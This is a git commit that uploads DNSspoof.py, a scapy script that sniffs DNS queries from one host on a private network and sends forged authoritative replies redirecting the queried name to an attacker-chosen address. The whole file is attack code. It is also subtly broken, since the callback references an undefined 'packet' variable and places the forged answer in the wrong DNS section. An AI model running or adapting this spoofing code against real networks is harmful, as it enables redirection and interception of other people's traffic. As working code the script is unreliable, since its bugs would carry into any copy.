d6273ec6f3a83b475ad77106a1525127e1b7012a
ThanosP2 <80784210+ThanosP2@users.noreply.github.com>
2022-06-09 19:13:54 +0200

    Add files via upload

---
+++ DNSspoof.py
@@ -0,0 +1,64 @@
+#! /usr/bin/python
+
+from scapy.all import *
+import sys
+
+interface = "enp0s3"
+ServerIP = "192.168.56.102"
+packet_filter = " and ".join([
+    "udp dst port 53",          # Filter UDP port 53
+    "udp[10] & 0x80 = 0",       # DNS queries only
+    "src host 192.168.56.101"    # IP source <ip>
+    ])
+
+def dns_reply(pkt):
+    # Construct the DNS packet
+    # Construct the Ethernet header by looking at the sniffed packet
+    eth = Ether(
+        src=packet[Ether].dst,
+        dst=packet[Ether].src
+        )
+
+    # Construct the IP header by looking at the sniffed packet
+    ip = IP(
+        src=packet[IP].dst,
+        dst=packet[IP].src
+        )
+
+    # Construct the UDP header by looking at the sniffed packet
+    udp = UDP(
+        dport=packet[UDP].sport,
+        sport=packet[UDP].dport
+        )
+
+    # Construct the DNS response by looking at the sniffed packet and manually
+    dns = DNS(
+        id=packet[DNS].id,
+        qd=packet[DNS].qd,
+        aa=1,
+        rd=0,
+        qr=1,
+        qdcount=1,
+        ancount=1,
+        nscount=0,
+        arcount=0,
+        ar=DNSRR(
+            rrname=packet[DNS].qd.qname,
+            type='A',
+            ttl=600,
+            rdata='192.168.56.101')
+        )
+
+    # Put the full packet together
+    response_packet = eth / ip / udp / dns
+
+    # Send the DNS response
+    sendp(response_packet, iface=interface)
+
+
+sniff(prn=dns_reply, filter=packet_filter, store=0, iface = interface, count = 1)
+
+
+        
+		
+
